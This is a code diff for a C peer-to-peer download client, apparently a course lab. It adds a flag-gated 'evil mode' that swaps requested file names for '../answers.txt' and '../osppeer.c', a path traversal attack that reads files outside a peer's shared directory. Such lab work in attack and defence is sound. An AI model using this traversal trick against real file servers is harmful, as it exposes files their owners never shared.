@@ -323,7 +323,7 @@ static size_t read_tracker_response(task_t *t)
 			memcpy(newBuf, t->buf, t->curBufSize);
 			t->buf = newBuf;
 			t->curBufSize = t->curBufSize * 2;
-			message("* Resize to %i!\n", t->curBufSize);
+			message("* Bufer exceeded, resize to %i\n", t->curBufSize);
 			continue;
 			die("tracker connection closed prematurely!\n");
 		}
@@ -476,7 +476,13 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	size_t messagepos;
 	assert(tracker_task->type == TASK_TRACKER);
 
-	message("* Finding peers for '%s'\n", filename);
+	// EVIL MODE options
+	if ((evil_mode) && (strncmp(filename, "cat1.jpg", 8) == 0))
+		message("* EVIL MODE! Try to get answers.txt instead\n");
+	else if ((evil_mode) && (strncmp(filename, "cat2.jpg", 8) == 0))
+		message("* EVIL MODE! Try to get osppeer.c instead\n");
+	else
+		message("* Finding peers for '%s'\n", filename);
 
 	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
 	messagepos = read_tracker_response(tracker_task);
@@ -494,7 +500,14 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 		error("* File name too large!");
 		goto exit;
 	}
-	strncpy(t->filename, filename, sizeof(t->filename));
+
+	// EVIL MODE options
+	if ((evil_mode) && (strncmp(filename, "cat1.jpg", 8) == 0))
+		strncpy(t->filename, "../answers.txt", sizeof(t->filename));
+	else if ((evil_mode) && (strncmp(filename, "cat2.jpg", 8) == 0))
+		strncpy(t->filename, "../osppeer.c", sizeof(t->filename));
+	else
+		strncpy(t->filename, filename, sizeof(t->filename));
 
 	// add peers
 	s1 = tracker_task->buf;
